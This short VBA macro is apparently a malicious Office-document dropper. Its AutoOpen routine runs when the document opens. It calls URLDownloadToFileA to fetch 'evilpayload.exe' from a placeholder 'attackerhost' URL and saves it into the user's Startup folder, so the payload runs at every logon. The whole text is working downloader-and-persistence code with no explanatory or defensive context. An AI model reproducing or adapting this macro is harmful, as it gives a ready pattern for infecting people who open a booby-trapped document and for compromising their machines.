Private Declare PtrSafe Function URLDownloadToFileA Lib "urlmon" (ByVal pCaller As Long, _
ByVal szURL As String, ByVal szFileName As String, ByVal dwReserved As Long, _
ByVal lpfnCB As Long) As Long
Sub AutoOpen()

Path = CreateObject("WScript.Shell").SpecialFolders("Startup")
x = URLDownloadToFileA(0, "https://attackerhost/evilpayload.exe", Path & "\test.exe", 0, 0)
End Sub
